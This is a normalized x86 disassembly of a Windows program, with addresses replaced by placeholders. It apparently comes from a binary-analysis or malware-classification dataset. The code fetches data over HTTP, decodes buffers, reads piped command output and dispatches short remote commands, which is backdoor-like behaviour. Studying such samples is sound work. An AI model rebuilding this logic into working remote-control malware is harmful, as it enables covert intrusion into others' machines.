push eax
call sub_40e1ab
mov ecx [ edi + 0x14 ]
push ecx
xor ebx ebx
mov esi eax
push ebx
push esi
call sub_414890
mov edx [ edi + 0x14 ]
push edi
lea edi [ esp + 0x24 ]
mov [ esp + 0x24 ] edx
call sub_4053b0
add esp 0x14
test eax eax
je r-xdata
test ebp ebp
je r-xdata
mov eax [ esp + 0x10 ]
mov edi [ rw-data ]
push eax
push esi
push ebx
push ebx
push ebp
call [ HttpSendRequestA@IAT ]
test eax eax
jne r-xdata
cmp [ esp + 0x1c ] edi
je r-xdata
push 0x4
lea ecx [ esp + 0x24 ]
push ecx
push 0x6
push ebp
call esi
test eax eax
je r-xdata
mov eax 0x1
push ebp
call [ InternetCloseHandle@IAT ]
push esi
call sub_40f2fb
add esp 0x4
mov [ esp + 0x24 ] ebx
mov [ esp + 0x2c ] 0x4
cmp ebp ebx
je r-xdata
call [ GetLastError@IAT ]
mov [ edi ] eax
cmp ebp ebx
je r-xdata
push 0x4
lea edx [ esp + 0x20 ]
push edx
push 0x5
push ebp
call esi
test eax eax
jne r-xdata
lea ecx [ esp + 0x24 ]
push ecx
lea edx [ esp + 0x30 ]
push edx
lea eax [ esp + 0x30 ]
push eax
push 0x20000013
push ebp
call [ HttpQueryInfoA@IAT ]
cmp eax ebx
je r-xdata
push esi
call sub_40f2fb
add esp 0x4
xor eax eax
jmp r-xdata
push ebp
call [ InternetCloseHandle@IAT ]
cmp [ esp + 0x28 ] 0xc8
jne r-xdata
mov ecx [ esp + 0x40030 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_40e1e0
add esp 0x40024
retn
push ebp
lea edx [ esp + 0x18 ]
mov [ esp + 0x18 ] ebx
call sub_40e070
cmp eax ebx
je r-xdata
push 0x3ffff
lea ecx [ esp + 0x35 ]
push ebx
push ecx
mov [ esp + 0x24 ] ebx
xor edi edi
mov [ esp + 0x3c ] bl
call sub_414890
mov ebx [ InternetQueryDataAvailable@IAT ]
add esp 0xc
lea esp [ esp ]
call [ GetLastError@IAT ]
mov [ esi ] eax
mov eax [ esp + 0x10 ]
cmp eax 0x40000
jbe r-xdata
mov esi [ rw-data ]
lea ecx [ esp + 0x18 ]
push ecx
push eax
lea edx [ esp + 0x38 ]
push edx
push ebp
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
mov eax 0x40000
add edi [ esp + 0x18 ]
push 0x64
call [ Sleep@IAT ]
cmp edi [ esp + 0x14 ]
jb r-xdata
mov esi [ rw-data ]
push 0x0
push 0x0
lea edx [ esp + 0x18 ]
push edx
push ebp
mov [ esp + 0x20 ] 0x0
call ebx
test eax eax
je r-xdata
jmp r-xdata
sub_404da0
push 0xffffffff
push sub_420d8b
mov eax [ fs : 0x0 ]
push eax
mov eax 0x2038
call sub_41c2a0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2034 ] eax
push ebx
push ebp
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2048 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x2058 ]
xor ebx ebx
mov [ esp + 0x20 ] eax
mov esi ecx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x24 ] 0x4
cmp edi ebx
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x28 ]
push edx
lea eax [ esp + 0x20 ]
push eax
push 0x20000005
push edi
call [ HttpQueryInfoA@IAT ]
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x2048 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x2034 ]
xor ecx esp
call sub_40e1e0
add esp 0x2044
retn
push r--data
push esi
call sub_40eeee
mov esi eax
add esp 0x8
cmp esi ebx
je r-xdata
push 0x2
push ebx
push esi
call sub_40f7fc
push 0x1fff
lea ecx [ esp + 0x55 ]
push ebx
push ecx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x5c ] bl
call sub_414890
mov ebp [ InternetQueryDataAvailable@IAT ]
add esp 0x18
push esi
call sub_40fc45
add esp 0x4
mov eax 0x1
push ebx
push ebx
lea eax [ esp + 0x24 ]
push eax
push edi
call ebp
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov ecx [ esp + 0x20 ]
push esi
mov [ ecx ] eax
call sub_40fc45
add esp 0x4
xor eax eax
jmp r-xdata
mov edx [ esp + 0x1c ]
lea ecx [ esp + 0x14 ]
push ecx
push edx
lea eax [ esp + 0x4c ]
push eax
push edi
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov edx [ esp + 0x20 ]
push esi
mov [ edx ] eax
call sub_40fc45
add esp 0x4
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x14 ]
xor eax eax
cmp ecx ebx
jbe r-xdata
push esi
push 0x1
push ecx
lea eax [ esp + 0x50 ]
push eax
call sub_40f4e5
push esi
call sub_40e5c4
add esp 0x14
test eax eax
jne r-xdata
jmp r-xdata
push rw-data
call [ EnterCriticalSection@IAT ]
push 0x11
push r--data
lea ecx [ esp + 0x30 ]
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] bl
call sub_409850
lea eax [ esp + 0x28 ]
push eax
mov [ esp + 0x2054 ] ebx
call sub_408f40
cmp [ esp + 0x40 ] 0x10
jb r-xdata
mov eax [ esp + 0x10 ]
add eax [ esp + 0x14 ]
mov [ esp + 0x10 ] eax
cmp eax [ esp + 0x18 ]
jb r-xdata
movzx edx [ esp + eax + 0x44 ]
mov dl [ edx + rw-data ]
mov [ esp + eax + 0x44 ] dl
inc eax
cmp eax ecx
jb r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
push esi
call sub_40fc45
add esp 0x4
mov ecx [ esp + 0x2c ]
push ecx
call sub_40f2fb
add esp 0x4
mov edx [ rw-data ]
push ebx
push edx
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
sub_404ff0
push 0xffffffff
push sub_420928
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x80 ]
mov [ esp + 0x14 ] eax
xor ebx ebx
mov ebp 0xf
mov eax ecx
mov esi edx
mov [ esp + 0x4c ] ebp
mov [ esp + 0x48 ] ebx
mov [ esp + 0x38 ] bl
lea edi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax edi
push eax
push ecx
lea ecx [ esp + 0x3c ]
call sub_409850
mov [ esp + 0x78 ] ebx
mov eax esi
mov [ esp + 0x30 ] ebp
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push esi
lea ecx [ esp + 0x20 ]
call sub_409850
mov [ esp + 0x78 ] 0x1
push ebx
push r--data
lea ecx [ esp + 0x58 ]
mov [ esp + 0x70 ] ebp
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] bl
call sub_409850
push 0x1
push r--data
lea eax [ esp + 0x20 ]
mov [ esp + 0x80 ] 0x2
call sub_409740
mov edx [ esp + 0x1c ]
mov edi 0x10
cmp [ esp + 0x30 ] edi
jae r-xdata
mov eax edx
lea esi [ eax + 0x1 ]
lea edx [ esp + 0x1c ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
push eax
push edx
lea ecx [ esp + 0x3c ]
push ecx
call sub_408d90
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0x2c ]
mov esi [ esp + 0x48 ]
lea edi [ edx + eax ]
cmp edi esi
jae r-xdata
cmp [ esp + 0x68 ] edi
jb r-xdata
mov edi [ esp + 0x68 ]
mov ebp [ esp + 0x54 ]
mov eax ebp
cmp edi 0x10
jae r-xdata
jbe r-xdata
mov [ esp + 0x68 ] ebp
mov [ esp + 0x64 ] ebx
mov [ esp + 0x54 ] bl
cmp [ esp + 0x30 ] edi
jb r-xdata
mov edx [ esp + 0x54 ]
push edx
call sub_40f2fb
add esp 0x4
mov esi [ esp + 0x64 ]
mov edx [ esp + 0x14 ]
push esi
push eax
push edx
call sub_4158c0
mov eax [ esp + 0x20 ]
mov [ esi + eax ] bl
mov esi 0x10
add esp 0xc
cmp edi esi
jb r-xdata
lea eax [ esp + 0x54 ]
cmp [ esp + 0x4c ] 0x10
mov eax [ esp + 0x38 ]
jae r-xdata
call sub_40ee1a
mov esi [ esp + 0x48 ]
mov [ esp + 0x30 ] ebp
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
cmp [ esp + 0x4c ] edi
jb r-xdata
mov eax [ esp + 0x1c ]
push eax
call sub_40f2fb
add esp 0x4
mov edi 0xf
mov [ esp + 0x68 ] edi
mov [ esp + 0x64 ] ebx
mov [ esp + 0x54 ] bl
cmp [ esp + 0x30 ] esi
jb r-xdata
push ebp
call sub_40f2fb
add esp 0x4
mov cl [ esp + 0x84 ]
cmp [ eax + edi ] cl
je r-xdata
lea eax [ esp + 0x38 ]
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x38 ]
push ecx
call sub_40f2fb
add esp 0x4
mov [ esp + 0x30 ] edi
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
cmp [ esp + 0x4c ] esi
jb r-xdata
mov ecx [ esp + 0x1c ]
push ecx
call sub_40f2fb
add esp 0x4
cmp edi esi
jbe r-xdata
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x58 ]
xor ecx esp
call sub_40e1e0
add esp 0x68
retn
mov eax 0x1
mov edx [ esp + 0x38 ]
push edx
call sub_40f2fb
add esp 0x4
cmp [ esp + 0x4c ] 0x10
mov eax [ esp + 0x38 ]
jae r-xdata
call sub_40ee1a
mov bl [ eax + edi ]
lea esi [ esp + 0x50 ]
call sub_408a80
mov esi [ esp + 0x48 ]
inc edi
xor ebx ebx
cmp edi esi
jb r-xdata
lea eax [ esp + 0x38 ]
sub_405250
push 0xffffffff
push sub_420d4b
mov eax [ fs : 0x0 ]
push eax
mov eax 0x1828
call sub_41c2a0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1824 ] eax
push ebx
push ebp
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1838 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push ebx
lea eax [ esp + 0x14 ]
push eax
push ebx
push ebx
push ebx
push edi
mov [ esp + 0x28 ] ebx
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x1838 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x1824 ]
xor ecx esp
call sub_40e1e0
add esp 0x1834
retn
mov ebp [ ReadFile@IAT ]
push 0x17ff
lea ecx [ esp + 0x39 ]
push ebx
push ecx
mov [ esp + 0x40 ] bl
call sub_414890
add esp 0xc
push ebx
lea edx [ esp + 0x18 ]
push edx
push esi
lea eax [ esp + 0x40 ]
push eax
push edi
mov [ esp + 0x28 ] ebx
call ebp
push rw-data
call [ EnterCriticalSection@IAT ]
lea eax [ esp + 0x34 ]
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
lea esi [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
push eax
lea ecx [ esp + 0x38 ]
push ecx
lea ecx [ esp + 0x20 ]
call sub_409850
lea edx [ esp + 0x18 ]
push edx
mov [ esp + 0x1844 ] ebx
call sub_408f40
mov [ esp + 0x1840 ] 0xffffffff
cmp [ esp + 0x30 ] 0x10
jb r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
push ebx
lea ecx [ esp + 0x14 ]
push ecx
push ebx
push ebx
push ebx
push edi
call [ PeekNamedPipe@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
push eax
call sub_40f2fb
add esp 0x4
mov esi [ esp + 0x10 ]
cmp esi ebx
je r-xdata
sub_4053b0
mov eax 0x83b8
call sub_41c2a0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x83b4 ] eax
mov eax [ esp + 0x83bc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
cmp [ eax + 0x18 ] 0x10
mov [ esp ] ecx
mov [ esp + 0x4 ] ecx
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov ecx [ esp + 0x83b4 ]
xor ecx esp
mov eax 0x1
call sub_40e1e0
add esp 0x83b8
retn
movzx edx [ esi + eax ]
mov cl [ edx + rw-data ]
mov [ esi + eax ] cl
inc eax
cmp eax [ edi ]
jb r-xdata
push ebx
push ebp
lea ecx [ esp + 0xc ]
push ecx
push eax
lea ecx [ esp + 0x10 ]
lea eax [ esp + 0x18 ]
call sub_40d6d0
mov ebx [ esp + 0xc ]
mov ebp [ esp + 0x8 ]
push ebx
push ebp
push esi
call sub_4158c0
push ebp
mov [ edi ] ebx
call sub_410135
add esp 0x10
xor eax eax
pop ebp
pop ebx
cmp [ edi ] eax
jbe r-xdata
sub_405450
push 0xffffffff
push sub_42103b
mov eax [ fs : 0x0 ]
push eax
mov eax 0x93ec
call sub_41c2a0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x93e8 ] eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x93f8 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push 0x7ff
lea eax [ esp + 0x8bf9 ]
push ebx
push eax
mov [ esp + 0x8c00 ] bl
call sub_414890
add esp 0xc
push 0x7ff
lea ecx [ esp + 0x83f9 ]
push ebx
push ecx
mov [ esp + 0x8400 ] bl
call sub_414890
mov eax [ esp + 0x9418 ]
mov edx [ esp + 0x9414 ]
mov [ esp + 0x83d4 ] eax
lea ecx [ esp + 0x1c ]
xor eax eax
mov [ esp + 0x83cc ] edx
mov [ esp + 0x83d0 ] ecx
lea edx [ esp + 0x20 ]
mov [ esp + 0x83b6 ] ax
xor ecx ecx
add esp 0xc
lea eax [ esp + 0x34 ]
mov [ esp + 0x83d0 ] edx
mov [ esp + 0x83d4 ] ebx
mov [ esp + 0x83d8 ] ebx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x83ac ] bl
mov [ esp + 0x83ae ] cx
mov [ esp + 0x83b0 ] bl
mov [ esp + 0x83dc ] 0x1
call sub_40d2d0
mov edx [ esp + 0x14 ]
mov esi [ esp + 0x10 ]
push edx
lea eax [ esp + 0x8bf8 ]
push esi
push eax
call sub_4158c0
add esp 0xc
push esi
call sub_410135
mov ecx [ esp + 0x18 ]
add esp 0x4
push ecx
lea edx [ esp + 0x8bf8 ]
lea ecx [ esp + 0x83f8 ]
mov [ esp + 0x14 ] ebx
call sub_404920
add esp 0x4
xor eax eax
lea edx [ esp + 0x83e4 ]
push 0xffffffec
push edx
mov edx r--data
lea ecx [ esp + 0x83fc ]
mov [ esp + 0x83ec ] bl
mov [ esp + 0x83ed ] eax
mov [ esp + 0x83f1 ] eax
mov [ esp + 0x83f5 ] eax
mov [ esp + 0x83f9 ] ax
mov [ esp + 0x83fb ] al
call sub_404ff0
add esp 0x8
test eax eax
je r-xdata
xor eax eax
push 0x2
lea eax [ esp + 0x83e8 ]
push r--data
push eax
call sub_40e771
add esp 0xc
test eax eax
jne r-xdata
push 0x2
lea ecx [ esp + 0x83e8 ]
push r--data
push ecx
call sub_40e771
add esp 0xc
test eax eax
jne r-xdata
call sub_4058f0
jmp r-xdata
push 0x2
lea edx [ esp + 0x83e8 ]
push r--data
push edx
call sub_40e771
add esp 0xc
test eax eax
jne r-xdata
lea esi [ esp + 0x83f4 ]
call sub_405a30
jmp r-xdata
mov ecx [ esp + 0x93f8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ esp + 0x93e8 ]
xor ecx esp
call sub_40e1e0
add esp 0x93f8
retn
push 0x2
lea eax [ esp + 0x83e8 ]
push r--data
push eax
call sub_40e771
add esp 0xc
test eax eax
jne r-xdata
lea ecx [ esp + 0x83f4 ]
call sub_405b30
jmp r-xdata
push 0x2
lea ecx [ esp + 0x83e8 ]
push r--data
push ecx
call sub_40e771
add esp 0xc
test eax eax
jne r-xdata
lea ecx [ esp + 0x83f4 ]
call sub_405cd0
jmp r-xdata
push 0x2
lea edx [ esp + 0x83e8 ]
push r--data
push edx
call sub_40e771
add esp 0xc
test eax eax
jne r-xdata
lea ecx [ esp + 0x83f4 ]
call sub_405e50
jmp r-xdata
push 0x2
lea eax [ esp + 0x83e8 ]
push r--data
push eax
call sub_40e771
add esp 0xc
test eax eax
jne r-xdata
lea esi [ esp + 0x83f4 ]
call sub_406550
jmp r-xdata
push 0x3
lea ecx [ esp + 0x83e8 ]
push r--data
push ecx
call sub_40e771
add esp 0xc
test eax eax
jne r-xdata
lea ecx [ esp + 0x83f4 ]
call sub_4060f0
jmp r-xdata
push 0x2
lea edx [ esp + 0x83e8 ]
push r--data
push edx
call sub_40e771
add esp 0xc
test eax eax
jne r-xdata
push 0x26
push r--data
mov ecx rw-data
call sub_409850
mov eax 0x1
jmp r-xdata
push 0x3
lea eax [ esp + 0x83e8 ]
push r--data
push eax
call sub_40e771
add esp 0xc
test eax eax
jne r-xdata
call sub_406610
jmp r-xdata
push 0x3
lea ecx [ esp + 0x83e8 ]
push r--data
push ecx
call sub_40e771
add esp 0xc
test eax eax
jne r-xdata
lea esi [ esp + 0x83f4 ]
call sub_406c70
jmp r-xdata
push 0x4
lea edx [ esp + 0x83e8 ]
push r--data
push edx
call sub_40e771
add esp 0xc
test eax eax
jne r-xdata
call sub_4067a0
jmp r-xdata
push 0x4
lea eax [ esp + 0x83e8 ]
push r--data
push eax
call sub_40e771
add esp 0xc
test eax eax
jne r-xdata
lea ecx [ esp + 0x83f4 ]
call sub_406d40
jmp r-xdata
push 0x4
lea ecx [ esp + 0x83e8 ]
push r--data
push ecx
call sub_40e771
add esp 0xc
test eax eax
jne r-xdata
call sub_406960
jmp r-xdata
push 0x2
lea edx [ esp + 0x83e8 ]
push r--data
push edx
call sub_40e771
add esp 0xc
test eax eax
jne r-xdata
lea ecx [ esp + 0x83f4 ]
call sub_407250
jmp r-xdata
push 0x3
lea eax [ esp + 0x83e8 ]
push r--data
push eax
call sub_40e771
add esp 0xc
test eax eax
jne r-xdata
lea ecx [ esp + 0x83f4 ]
call sub_4061d0
jmp r-xdata
push rw-data
call [ EnterCriticalSection@IAT ]
push r--data
lea ecx [ esp + 0x1c ]
call sub_408300
lea ecx [ esp + 0x18 ]
push ecx
mov [ esp + 0x9404 ] ebx
call sub_408f40
lea ecx [ esp + 0x18 ]
call sub_408370
push rw-data
call [ LeaveCriticalSection@IAT ]
lea ecx [ esp + 0x83f4 ]
call sub_406280
jmp r-xdata
sub_4058f0
push 0xffffffff
push sub_420d06
mov eax [ fs : 0x0 ]
push eax
mov eax 0x2028
call sub_41c2a0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2024 ] eax
push ebx
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2030 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov [ esp + 0xc ] ebx
push 0x1fff
lea eax [ esp + 0x31 ]
push ebx
mov [ esp + 0x2040 ] ebx
push eax
mov [ esp + 0x38 ] bl
call sub_414890
add esp 0xc
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
lea ecx [ esp + 0x2c ]
push ecx
lea edx [ esp + 0xc ]
push edx
mov [ esp + 0x10 ] eax
call sub_40d7b0
push rw-data
call [ EnterCriticalSection@IAT ]
lea eax [ esp + 0x2c ]
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] bl
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x30 ]
push eax
lea ecx [ esp + 0x18 ]
call sub_409850
lea ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x203c ] 0x1
call sub_408f40
cmp [ esp + 0x28 ] 0x10
jb r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
cmp [ esp + 0xc ] ebx
jne r-xdata
mov edx [ esp + 0x14 ]
push edx
call sub_40f2fb
add esp 0x4
mov eax 0x1
mov ecx [ esp + 0x2030 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov ecx [ esp + 0x2024 ]
xor ecx esp
call sub_40e1e0
add esp 0x2034
retn
push ebx
call sub_410135
add esp 0x4
sub_405a30
push 0xffffffff
push sub_420cc8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x18 ] eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x20 ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ esp + 0xc ] 0x0
mov [ esp + 0xd ] eax
mov [ esp + 0x11 ] eax
mov [ esp + 0x15 ] eax
mov [ esp + 0x19 ] ax
mov [ esp + 0x1b ] al
mov [ esp + 0x8 ] eax
push r--data
push r--data
mov [ esp + 0x30 ] eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ esp + 0x4 ] eax
lea eax [ esp + 0xc ]
push 0xffffffec
push eax
mov edx r--data
mov ecx esi
call sub_404ff0
lea ecx [ esp + 0x14 ]
push ecx
call sub_40e9c3
add esp 0xc
test eax eax
jne r-xdata
push eax
call sub_40dbb0
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
call sub_40dc10
jmp r-xdata
push 0x14
push r--data
push 0x15
push r--data
jmp r-xdata
mov ecx rw-data
test eax eax
je r-xdata
mov eax 0x1
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ esp + 0x18 ]
xor ecx esp
call sub_40e1e0
add esp 0x28
retn
push 0x0
call sub_410135
add esp 0x4
call sub_409850
cmp [ esp + 0x8 ] 0x0
jne r-xdata
sub_405b30
sub esp 0x414
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x410 ] eax
push esi
push edi
push 0x1ff
lea eax [ esp + 0x21d ]
push 0x0
push eax
mov esi ecx
mov [ esp + 0x224 ] 0x0
call sub_414890
push 0x1ff
lea ecx [ esp + 0x29 ]
push 0x0
push ecx
mov [ esp + 0x30 ] 0x0
call sub_414890
xor eax eax
lea edx [ esp + 0x230 ]
push 0xffffffec
push edx
mov edx r--data
mov ecx esi
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x29 ] eax
mov [ esp + 0x2d ] eax
mov [ esp + 0x31 ] eax
mov [ esp + 0x35 ] ax
mov [ esp + 0x37 ] al
call sub_404ff0
lea eax [ esp + 0x38 ]
push 0xffffffec
push eax
mov edx r--data
mov ecx esi
call sub_404ff0
lea ecx [ esp + 0x30 ]
push 0xffffffec
push ecx
mov edx r--data
mov ecx esi
call sub_404ff0
lea edx [ esp + 0x38 ]
push edx
call sub_40e9c3
mov edi eax
lea eax [ esp + 0x4c ]
push r--data
push eax
call sub_40eeee
mov esi eax
add esp 0x3c
test esi esi
jne r-xdata
push ebp
push 0x2
push 0x0
push esi
call sub_40f7fc
push esi
call sub_40f704
push esi
mov ebp eax
call sub_40fc45
add esp 0x14
cmp ebp edi
jb r-xdata
lea ecx [ esp + 0x18 ]
push r--data
push ecx
call sub_40eeee
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
xor eax eax
lea esp [ esp ]
push 0x29
push r--data
mov ecx rw-data
call sub_409850
jmp r-xdata
push 0x1d
push r--data
mov ecx rw-data
call sub_409850
jmp r-xdata
mov cl [ esp + eax + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
test cl cl
jne r-xdata
xor eax eax
pop ebp
mov ecx [ esp + 0x418 ]
pop edi
pop esi
xor ecx esp
mov eax 0x1
call sub_40e1e0
add esp 0x414
retn
mov cl [ esp + eax + 0x21c ]
mov [ eax + rw-data ] cl
inc eax
test cl cl
jne r-xdata
push 0x0
push 0x0
push 0x0
push sub_402b50
push 0x0
push 0x0
mov [ rw-data ] ebp
mov [ rw-data ] edi
call sub_40ec0d
add esp 0x18
mov [ rw-data ] eax
sub_405cd0
sub esp 0x414
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x410 ] eax
push esi
push edi
push 0x1ff
lea eax [ esp + 0x21d ]
push 0x0
push eax
mov esi ecx
mov [ esp + 0x224 ] 0x0
call sub_414890
push 0x1ff
lea ecx [ esp + 0x29 ]
push 0x0
push ecx
mov [ esp + 0x30 ] 0x0
call sub_414890
xor eax eax
lea edx [ esp + 0x30 ]
push 0xffffffec
push edx
mov edx r--data
mov ecx esi
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x29 ] eax
mov [ esp + 0x2d ] eax
mov [ esp + 0x31 ] eax
mov [ esp + 0x35 ] ax
mov [ esp + 0x37 ] al
call sub_404ff0
lea eax [ esp + 0x238 ]
push 0xffffffec
push eax
mov edx r--data
mov ecx esi
call sub_404ff0
lea ecx [ esp + 0x30 ]
push 0xffffffec
push ecx
mov edx r--data
mov ecx esi
call sub_404ff0
lea edx [ esp + 0x38 ]
push edx
call sub_40e9c3
mov edi eax
lea eax [ esp + 0x4c ]
push r--data
push eax
call sub_40eeee
mov esi eax
add esp 0x3c
test esi esi
jne r-xdata
push ebp
push 0x2
push 0x0
push esi
call sub_40f7fc
push esi
call sub_40f704
push esi
mov ebp eax
call sub_40fc45
add esp 0x14
cmp ebp edi
ja r-xdata
push 0x1b
push r--data
mov ecx rw-data
call sub_409850
jmp r-xdata
xor eax eax
push 0x28
push r--data
mov ecx rw-data
call sub_409850
jmp r-xdata
mov ecx [ esp + 0x418 ]
pop edi
pop esi
xor ecx esp
mov eax 0x1
call sub_40e1e0
add esp 0x414
retn
mov cl [ esp + eax + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
test cl cl
jne r-xdata
xor eax eax
pop ebp
mov cl [ esp + eax + 0x21c ]
mov [ eax + rw-data ] cl
inc eax
test cl cl
jne r-xdata
push 0x0
push 0x0
push 0x0
push sub_4031d0
push 0x0
push 0x0
mov [ rw-data ] ebp
mov [ rw-data ] edi
call sub_40ec0d
add esp 0x18
mov [ rw-data ] eax
sub_405e50
sub esp 0xc64
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xc5c ] eax
push ebx
push esi
xor ebx ebx
push 0xff
lea eax [ esp + 0x165 ]
push ebx
push eax
mov esi ecx
mov [ esp + 0x16c ] bl
call sub_414890
push 0xff
lea ecx [ esp + 0x271 ]
push ebx
push ecx
mov [ esp + 0x278 ] bl
call sub_414890
push 0xff
lea edx [ esp + 0x7d ]
push ebx
push edx
mov [ esp + 0x84 ] bl
call sub_414890
push 0xff
lea eax [ esp + 0x389 ]
push ebx
push eax
mov [ esp + 0x390 ] bl
call sub_414890
push 0x1fe
lea edx [ esp + 0xa96 ]
xor ecx ecx
push ebx
push edx
mov [ esp + 0xa9c ] cx
call sub_414890
push 0x1fe
lea ecx [ esp + 0x8a2 ]
xor eax eax
push ebx
push ecx
mov [ esp + 0x8a8 ] ax
call sub_414890
add esp 0x48
push 0x1fe
lea eax [ esp + 0x666 ]
xor edx edx
push ebx
push eax
mov [ esp + 0x66c ] dx
call sub_414890
push 0x1fe
lea edx [ esp + 0x472 ]
xor ecx ecx
push ebx
push edx
mov [ esp + 0x478 ] cx
call sub_414890
lea eax [ esp + 0x178 ]
push 0xffffffec
push eax
mov edx r--data
mov ecx esi
call sub_404ff0
lea ecx [ esp + 0x280 ]
push 0xffffffec
push ecx
mov edx r--data
mov ecx esi
call sub_404ff0
lea edx [ esp + 0x88 ]
push 0xffffffec
push edx
mov edx r--data
mov ecx esi
call sub_404ff0
lea eax [ esp + 0x390 ]
push 0xffffffec
push eax
mov edx r--data
mov ecx esi
call sub_404ff0
mov esi [ MultiByteToWideChar@IAT ]
add esp 0x38
push ebx
push ebx
push 0xffffffff
lea ecx [ esp + 0x16c ]
push ecx
push ebx
push ebx
call esi
push eax
lea edx [ esp + 0xa64 ]
push edx
push 0xffffffff
lea eax [ esp + 0x16c ]
push eax
push ebx
push ebx
call esi
push ebx
push ebx
push 0xffffffff
lea ecx [ esp + 0x26c ]
push ecx
push ebx
push ebx
call esi
push eax
lea edx [ esp + 0x864 ]
push edx
push 0xffffffff
lea eax [ esp + 0x26c ]
push eax
push ebx
push ebx
call esi
push ebx
push ebx
push 0xffffffff
lea ecx [ esp + 0x6c ]
push ecx
push ebx
push ebx
call esi
push eax
lea edx [ esp + 0x664 ]
push edx
push 0xffffffff
lea eax [ esp + 0x6c ]
push eax
push ebx
push ebx
call esi
push ebx
push ebx
push 0xffffffff
lea ecx [ esp + 0x36c ]
push ecx
push ebx
push ebx
call esi
push eax
lea edx [ esp + 0x464 ]
push edx
push 0xffffffff
lea eax [ esp + 0x36c ]
push eax
push ebx
push ebx
call esi
push 0x40
xor eax eax
lea ecx [ esp + 0x20 ]
push ebx
push ecx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
call sub_414890
